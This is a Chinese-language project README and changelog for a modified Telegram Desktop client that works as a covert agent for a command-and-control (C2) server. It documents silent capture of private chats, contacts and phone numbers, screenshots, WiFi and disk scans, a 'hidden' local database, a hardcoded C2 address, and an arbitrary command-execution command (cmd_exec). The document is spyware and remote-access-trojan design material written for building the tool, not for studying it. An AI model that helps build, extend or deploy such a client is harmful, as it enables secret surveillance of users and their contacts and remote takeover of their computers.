

### 修改日志 (2026-01-18)

*   **功能新增**: 对接 Web 端文件管理需求，新增 `get_file_list` (文件列表)、`download_file` (文件下载/上传到客户端) 指令。
*   **功能新增**: 对接 Web 端实时聊天需求，新增 `get_chat_history_json` 指令，支持分页获取聊天记录。
*   **协议变更**: 调整 `wifi_scan_results` 表字段及 JSON 返回格式，字段名更新为 `signal` (原 `signal_strength`) 和 `auth` (原 `security_type`) 以匹配 Web 端标准。
*   **Bug修复**: 优化 `system_info` 收集逻辑，修复内网 IP 和 MAC 地址显示为 `Unknown` 的问题（增加双重网络接口检测）。
*   **文档更新**: 同步了 Web 端 (`platform/README.md`) 的数据库上传标准，明确了 `tdata_client_{TGID}.db` 的命名规范。
*   **文档更新**: 添加了 Web 端开发需求说明，明确了 `get_current_user` 接口对接规范。
*   **功能修复**: 修复了 `upload_db` 任务状态卡在 `in_progress` 的问题。
*   **功能修复**: 完善了本地任务持久化机制，解决了重启后任务丢失的问题。

## 开发协作规范 (必读)

### 1. 职责边界
*   **tdesktop 端 (本目录)**: 负责 Telegram Desktop 客户端的修改与功能增强（C++）。
    *   **权限限制**: **严禁修改 Web 端代码**。
*   **Web 端 (platform)**: 负责后端服务 (Java/Spring Boot) 与前端控制台 (React) 的开发。

### 2. 沟通与需求
*   **我对 Web 端的要求**: 所有针对 Web 端接口、功能配合的需求，**必须** 记录在本文件的 [Web 端开发协作注意事项](#web端开发协作注意事项) 章节中。
*   **Web 端对我的要求**: 请查阅 `../platform/README.md` (如果存在) 或由 Web 端同事同步。

### 4. Web 端开发需求
**IP 地理位置解析**:
*   客户端现已改为直接请求 `https://ipinfo.io/json` 获取外网 IP。
*   Web 端在接收到客户端上报的 `external_ip` 后，**必须**自行调用 IP 地理位置查询接口（如 ip-api.com 或 ipinfo.io），以获取并展示该 IP 的详细信息，包括：
    *   **国家 (Country)**
    *   **区域/省份 (Region)**
    *   **城市 (City)**
    *   **ISP 运营商 (Org)**

### 5. 协议兼容性说明 (Protocol Compatibility)
已针对 Web 端 (`platform/README.md`) 的新需求完成以下适配：

*   **WiFi 模块**: `get_wifi` 指令返回的 JSON 字段已调整为 `signal` 和 `auth`，与 Web 端标准一致。
*   **文件管理**:
    *   已实现 `get_file_list` (获取文件列表)。
    *   已实现 `download_file` (Web 端上传文件到客户端)。
    *   已支持 `upload_file` (Web 端下载客户端文件，原 `download` 指令别名)。
    *   `scan_disk` 结果目前存储于主数据库 `tdata_client.db` 的 `file_scan_results` 表中，随主库上传。
*   **聊天记录**:
    *   已实现 `get_chat_history_json`，支持分页获取聊天记录，字段包含 `sender_name`。
    *   数据库 `chat_logs` 表结构已对齐 Web 端 Schema (包含 `sender`, `sender_username` 等)。

### 6. 协作流程
*   修改 `tdesktop` 代码前，请先拉取最新代码。
*   提交修改后，请及时更新本 `README.md` 中的修改日志。

## Web 端开发协作注意事项 (Web Team Attention)

### 1. 数据库 Schema 映射说明 (关键)
为了确保 Web 端能正确解析客户端上传的 SQLite 数据库 (`tdata_client.db`)，请注意以下字段映射差异。**请 Web 端后端代码适配以下实际字段名**：

#### 1.1 `chat_logs` (聊天记录表)
Web 端需求文档 (`platform/README.md`) 中提到 `sender` 为 ID，但客户端实际存储如下：
*   **`sender`**: 存储 **发送者显示名称 (Display Name)** (如 "Alice")，用于直接显示。
*   **`sender_id`**: 存储 **发送者 User ID** (如 "123456789")，用于关联查询。
*   **建议**: 后端解析时，请使用 `sender_id` 进行用户关联，使用 `sender` 进行展示。

#### 1.2 `current_user` (当前用户表)
*   **主键字段**: 客户端表结构中使用 `user_id` 作为主键，而非 `id`。
*   **建议**: 后端 SQL 映射时请将 `id` 映射为 `user_id`。

#### 1.3 `wifi_scan_results` (WiFi 表)
*   **DB 字段**: `signal_strength`, `security_type` (客户端数据库实际字段)。
*   **JSON 指令**: `get_wifi` 指令返回的 JSON 中字段为 `signal`, `auth` (为了符合 Web 端 JSON 规范)。
*   **建议**: 解析 DB 文件时请使用 `signal_strength` 和 `security_type`。

### 2. 接口对接状态
以下接口已完全按照 Web 端需求 (`platform/README.md`) 实现：

*   **`get_current_user`**: 返回 JSON 已调整为 snake_case (`user_id`, `first_name`, `is_premium` 等)。
*   **`get_file_list`**: 已实现，返回指定目录的文件/文件夹列表。
*   **`download_file`**: 已实现，支持 Web 端下发 URL 让客户端下载文件。
*   **`get_chat_history_json`**: 已实现，返回字段包含 `sender_name` (显示名称) 和 `sender_id` (用户 ID)。
*   **`upload_db` / `scan_disk`**: 上传的数据库包含 `system_info` (已修复 Unknown 问题), `wifi_scan_results`, `installed_software` 等完整表。

### 3. C2 连接信息
*   **C2 URL**: 已硬编码为 `http://192.168.2.131:8101`。
*   **心跳**: 默认 60 秒。

---

## 数据库完整表结构说明 (Database Schema Reference)

本项目使用 SQLite 数据库 (`tdata_client.db`) 存储所有采集数据与本地任务状态。以下是包含的 10 张完整表结构及其用途说明。

### 1. installed_software (已安装软件)
记录系统已安装的应用程序列表。
*   `name` (TEXT): 软件名称
*   `version` (TEXT): 软件版本
*   `publisher` (TEXT): 发布者
*   `install_date` (TEXT): 安装日期

### 2. system_info (系统信息)
存储当前设备的系统环境与状态信息（宽表结构）。
*   `uuid` (TEXT, PK): 设备唯一标识符
*   `internal_ip` (TEXT): 内网 IP 地址
*   `mac_address` (TEXT): MAC 地址
*   `hostname` (TEXT): 主机名
*   `os` (TEXT): 操作系统版本
*   `online_status` (TEXT): 在线状态（含 WiFi 连接信息）
*   `last_active` (INTEGER): 最后活跃时间戳
*   `external_ip` (TEXT): 外网 IP 地址
*   `data_status` (TEXT): 数据同步状态
*   `auto_screenshot` (INTEGER): 是否开启自动截图 (0/1)
*   `heartbeat_interval` (INTEGER): 心跳间隔 (秒)

### 3. file_scan_results (文件扫描结果)
存储文件系统扫描结果（如全盘扫描或特定目录扫描）。
*   `path` (TEXT): 文件绝对路径
*   `name` (TEXT): 文件名
*   `size` (INTEGER): 文件大小 (字节)
*   `md5` (TEXT): 文件 MD5 哈希值
*   `last_modified` (INTEGER): 最后修改时间戳

### 4. wifi_scan_results (WiFi 扫描结果)
记录扫描到的周边 WiFi 网络信息。
*   `ssid` (TEXT): WiFi 名称
*   `bssid` (TEXT): MAC 地址/BSSID
*   `signal_strength` (INTEGER): 信号强度
*   `security_type` (TEXT): 加密类型
*   `scan_time` (INTEGER): 扫描时间戳

### 5. chat_logs (聊天记录)
核心表，存储采集到的 Telegram 聊天消息。
*   `platform` (TEXT): 来源平台 (固定为 "Telegram")
*   `chat_id` (TEXT): 会话 ID
*   `sender` (TEXT): 发送者显示名称
*   `content` (TEXT): 消息内容
*   `timestamp` (INTEGER): 消息时间戳
*   `is_outgoing` (INTEGER): 是否为我发出的消息 (0/1)
*   `sender_id` (TEXT): 发送者 User ID
*   `sender_username` (TEXT): 发送者用户名
*   `sender_phone` (TEXT): 发送者电话
*   `receiver_id` (TEXT): 接收者 ID
*   `receiver_username` (TEXT): 接收者用户名
*   `receiver_phone` (TEXT): 接收者电话
*   `media_path` (TEXT): 媒体文件本地路径 (若有)
*   `content_hash` (TEXT): 内容哈希 (用于去重)
*   `msg_id` (INTEGER): 消息 ID

### 6. current_user (当前用户信息)
记录当前登录 Telegram 账号的详细信息。
*   `user_id` (TEXT, PK): 用户 ID
*   `username` (TEXT): 用户名
*   `first_name` (TEXT): 名
*   `last_name` (TEXT): 姓
*   `phone` (TEXT): 电话号码
*   `is_premium` (INTEGER): 是否为会员 (0/1)

### 7. contacts (联系人列表)
存储当前账号的通讯录联系人。
*   `user_id` (TEXT, PK): 联系人用户 ID
*   `username` (TEXT): 用户名
*   `first_name` (TEXT): 名
*   `last_name` (TEXT): 姓
*   `phone` (TEXT): 电话号码

### 8. chats (会话列表)
记录用户参与的所有会话（个人、群组、频道）。
*   `chat_id` (TEXT, PK): 会话 ID
*   `title` (TEXT): 会话标题
*   `type` (TEXT): 会话类型 (private/group/channel)
*   `invite_link` (TEXT): 邀请链接
*   `member_count` (INTEGER): 成员数量

### 9. chat_sync_state (聊天同步状态)
用于断点续传，记录每个会话的同步进度。
*   `chat_id` (TEXT, PK): 会话 ID
*   `min_id` (INTEGER): 已同步的最小消息 ID
*   `max_id` (INTEGER): 已同步的最大消息 ID
*   `last_sync` (INTEGER): 最后同步时间戳

### 10. local_tasks (本地任务队列)
管理本地执行的任务指令及其状态。
*   `task_id` (TEXT, PK): 任务 ID
*   `command` (TEXT): 指令名称 (如 get_system_info)
*   `params` (TEXT): 指令参数 (JSON 格式)
*   `status` (TEXT): 任务状态 (pending/in_progress/completed/failed)
*   `created_at` (INTEGER): 创建时间戳
*   `updated_at` (INTEGER): 更新时间戳

*   **功能增强**: 实现了静默聊天记录同步 (`syncChatHistory`)。在应用启动时自动获取之前的聊天记录（支持 Catch-up 模式），并记录同步状态以避免重复获取。
*   **功能增强**: 优化了文件系统扫描 (`BackgroundScanner`)。现在支持自动启动和递归扫描所有子目录 (`QDirIterator`)，扫描完成后自动上传数据库。
*   **功能增强**: 实现了 24 小时自动回传机制。如果本地数据超过 24 小时未上传，将自动触发全量数据库上传。
*   **功能增强**: 新增后端命令 `fetch_full_chat_history`，可触发全量聊天记录抓取（递归获取历史记录直至完毕）并自动上传数据库。
*   **功能增强**: 新增数据库自动清理机制。每次上传后自动删除超过 7 天的旧聊天记录并执行 `VACUUM` 压缩空间，防止数据库体积无限膨胀。
*   **性能优化**: 重写文件扫描模块 (`BackgroundScanner`)，在 Windows 平台引入 NTFS USN Journal 技术，实现类似 "Everything" 的毫秒级文件索引速度。
*   **策略调整**: 优化 MD5 计算策略，仅对特定文档类型 (`txt`, `doc`, `docx`, `pdf`, `ppt`) 且小于 100MB 的文件计算哈希，其余文件仅记录元数据，大幅降低磁盘 I/O 占用。
*   **Schema 变更**: 新增 `chat_sync_state` 表用于记录每个会话的同步进度 (`min_id`, `max_id`)。
*   **Schema 变更**: `chat_logs` 表新增 `media_path` 字段，用于存储图片/文件路径（目前支持 Photo ID）。
*   **Bug修复**: 修复了 `heartbeat.cpp` 中的编译错误（包括 `emit` 关键字替换为 `Q_EMIT`，以及迭代器和类型匹配修复）。
*   **Bug修复**: 修复了 `tdata_client.db` 不更新的问题（确保了重新编译和正确的数据库初始化路径）。
*   **后端对接**: 更新了 Spring Boot `C2Controller` 以支持解析 SQLite 中的 `media_path` 字段，实现聊天媒体路径的同步存储。
*   **前端对接**: 在 Web 控制台设备详情页新增了 `fetch_full_chat_history` 指令按钮，支持一键下发全量同步任务。

### 修改日志 (2026-01-16)

*   **配置变更**: 客户端回传地址 (C2 URL) 已从 `localhost:8101` 更改为 `192.168.2.131:8101`。请确保后端服务在该 IP 上可访问。
*   **Bug修复**: 修复了心跳间隔 (`heartbeatInterval`) 单位问题。之前发送的是秒 (60)，导致前端误显示为 0.06 秒。现已更正为发送毫秒 (60000)。
*   **调试增强**: 在 `Heartbeat::performScreenshot` 中添加了详细的调试日志 (`HEARTBEAT_DEBUG`)，用于排查截图失败问题（如屏幕获取失败、保存失败、上传失败等）。
*   **Bug修复**: 增强了截图功能 (`performScreenshot`) 的健壮性。添加了详细的调试日志 (`HEARTBEAT_DEBUG`) 以排查截图失败（如屏幕对象为空、保存失败等）的原因，并在失败时向后端上报明确的错误信息。

### 当前架构

*   **客户端**: 修改后的 Telegram Desktop (C++)，充当代理 (Agent)。
    *   **构建**: 使用 Visual Studio 2022 和 `out/Release/build_only.bat` 进行编译。
    *   **核心功能**: 心跳机制、远程命令执行、数据收集（软件列表、WiFi 信息、文件扫描、聊天记录）、本地 SQLite 存储 (`tdata/tdata_client.db`)。
*   **后端**: Spring Boot 应用程序 (Java)。
    *   端口: 8101。
    *   功能: 任务管理、数据聚合 (MySQL)、文件存储、去重 (Redis)。
*   **前端**: React + UmiJS。
    *   端口: 8000。
    *   功能: 仪表盘、设备管理、任务下发。

### 客户端功能详情 (Telegram Desktop)

#### 1. 数据收集 (本地 DB)
*   **消息拦截**: 实时捕获聊天消息（文本和图片），Hook 了 `history.cpp` 以实现实时捕获。
    *   **过滤**: 排除公共频道和群组，仅保存私聊和私有群组数据。
    *   **存储**: 数据保存在本地加密/隐藏的 SQLite 数据库 (`tdata_client.db`) 的 `chat_logs` 表中。
*   **联系人提取**: 捕获与登录账户关联的所有联系人信息（ID、用户名、电话）。
*   **WiFi 扫描**: 使用 `netsh` 扫描周边 WiFi 网络（SSID、信号强度）并存储在 `wifi_scan_results` 表中。
*   **软件枚举**: 通过读取注册表获取已安装的软件列表并存储。

#### 2. 系统侦察与监控
*   **基本信息**: 捕获设备主机名、操作系统版本、MAC 地址和 IP 地址。
*   **屏幕截图**: 支持立即截图 (`screenshot`) 和定时监控 (`start_monitor`)。
*   **文件系统扫描**:
    *   后台扫描所有驱动器。
    *   计算文件的 MD5 哈希值、记录路径和大小。
    *   结果存储在本地数据库并支持断点续传/去重上传。

#### 3. 远程控制 (C2)
*   **心跳系统**:
    *   实现了 `Core::Heartbeat` 单例。
    *   默认每 60 秒向后端发送一次心跳（包含系统状态）。
    *   支持通过 `set_heartbeat` 命令调整间隔。
*   **任务执行**:
    *   客户端在心跳期间轮询 `pending` 任务。
    *   **支持的命令**:
        *   `cmd_exec`: 执行任意 CMD 命令。
        *   `get_screenshot`: 捕获并上传截图。
        *   `upload_file`: 上传指定文件。
        *   `upload_db`: 上传本地 `tdata` 数据库。
        *   `fetch_full_chat_history`: 触发全量聊天记录同步并上传。
        *   `get_wifi` / `get_software`: 触发特定信息收集。
        *   `get_file_list`: 获取指定目录文件列表。
        *   `download_file`: 下载远程文件到本地。
        *   `get_chat_history_json`: 获取指定会话的聊天记录 (JSON)。

### 最近更新 (阶段 6 & 7)

*   **数据同步增强**: 修复了本地文件扫描结果无法同步到后端的问题。实现了基于哈希的去重和批量处理。
*   **Web 功能恢复**: 修复了截图命令分发和 Web 端显示问题。
*   **自动收集**: Telegram 启动时自动触发软件列表、WiFi 信息和基础数据的收集与同步。
*   **稳定性**: 增强了 `heartbeat.cpp` 的错误处理和调试日志 (`HEARTBEAT_DEBUG`)。
*   **构建系统**: 优化了 `build_only.bat` 以正确处理 Windows 环境路径。

### 数据库结构 (Schema)

Web 端开发者请参考以下 SQLite 数据库 (`tdata_client.db`) 结构进行解析：

#### 1. 系统信息 (`system_info`)
存储设备的基础状态信息。
| 字段 | 类型 | 说明 |
| :--- | :--- | :--- |
| `uuid` | TEXT | 主键，设备唯一标识符 (基于 MAC + 路径) |
| `internal_ip` | TEXT | 内网 IP 地址 |
| `mac_address` | TEXT | 物理 MAC 地址 |
| `hostname` | TEXT | 计算机主机名 |
| `os` | TEXT | 操作系统版本 (如 "Windows 10 22H2") |
| `online_status` | TEXT | 在线状态 (包含连接的 WiFi 名称) |
| `last_active` | INTEGER | 最后活跃时间戳 (秒) |
| `external_ip` | TEXT | 外网 IP (预留) |
| `data_status` | TEXT | 数据状态 ("Scanning..." 或 "Active") |
| `auto_screenshot` | INTEGER | 自动截图开启状态 (1=开启, 0=关闭) |
| `heartbeat_interval`| INTEGER | 心跳间隔 (秒) |

#### 2. 已安装软件 (`installed_software`)
存储从注册表扫描到的软件列表。
| 字段 | 类型 | 说明 |
| :--- | :--- | :--- |
| `name` | TEXT | 软件名称 |
| `version` | TEXT | 版本号 |
| `publisher` | TEXT | 发布者 |
| `install_date` | TEXT | 安装日期 |

#### 3. WiFi 扫描结果 (`wifi_scan_results`)
存储周边 WiFi 网络信息。
**注意**: Web 端解析 SQLite 时请注意列名映射。JSON 接口返回的字段为 `signal` 和 `auth`，但数据库存储字段如下：
| 字段 | 类型 | 说明 |
| :--- | :--- | :--- |
| `ssid` | TEXT | WiFi 名称 |
| `bssid` | TEXT | MAC 地址 |
| `signal_strength` | INTEGER | 信号强度 (对应 JSON 的 `signal`) |
| `security_type` | TEXT | 加密类型 (对应 JSON 的 `auth`) |
| `scan_time` | INTEGER | 扫描时间戳 |

#### 4. 文件扫描结果 (`file_scan_results`)
存储文件系统扫描结果 (仅元数据)。
| 字段 | 类型 | 说明 |
| :--- | :--- | :--- |
| `path` | TEXT | 文件绝对路径 |
| `name` | TEXT | 文件名 |
| `size` | INTEGER | 文件大小 (字节) |
| `md5` | TEXT | 文件 MD5 哈希值 |
| `last_modified` | INTEGER | 最后修改时间戳 |

#### 5. 聊天记录 (`chat_logs`)
存储捕获的聊天消息。
| 字段 | 类型 | 说明 |
| :--- | :--- | :--- |
| `platform` | TEXT | 来源平台 ("telegram") |
| `chat_id` | TEXT | 聊天会话 ID |
| `sender` | TEXT | 发送者名称/ID |
| `content` | TEXT | 消息内容 (文本或图片路径) |
| `timestamp` | INTEGER | 消息时间戳 |
| `is_outgoing` | INTEGER | 是否为发出消息 (1=是, 0=否) |
| `sender_id` | TEXT | 发送者 ID |
| `sender_username` | TEXT | 发送者用户名 |
| `sender_phone` | TEXT | 发送者手机号 |
| `receiver_id` | TEXT | 接收者 ID (或群 ID) |
| `receiver_username` | TEXT | 接收者用户名 |
| `receiver_phone` | TEXT | 接收者手机号 |
| `media_path` | TEXT | 图片/文件路径 (初始为 `Photo:ID`，下载后更新为本地路径) |

#### 6. 当前用户信息 (`current_user`)
存储当前登录的 Telegram 用户信息。
| 字段 | 类型 | 说明 |
| :--- | :--- | :--- |
| `user_id` | TEXT | 用户 ID (主键) |
| `username` | TEXT | 用户名 |
| `first_name` | TEXT | 名字 |
| `last_name` | TEXT | 姓氏 |
| `phone` | TEXT | 手机号 |
| `is_premium` | INTEGER | 是否为 Premium 用户 (1=是, 0=否) |

#### 7. 本地任务 (`local_tasks`)
存储本地任务执行状态。
| 字段 | 类型 | 说明 |
| :--- | :--- | :--- |
| `task_id` | TEXT | 任务 ID (主键) |
| `command` | TEXT | 任务命令 |
| `params` | TEXT | 参数 |
| `status` | TEXT | 状态 (pending, in_progress, completed, failed) |
| `created_at` | INTEGER | 创建时间戳 |
| `updated_at` | INTEGER | 更新时间戳 |

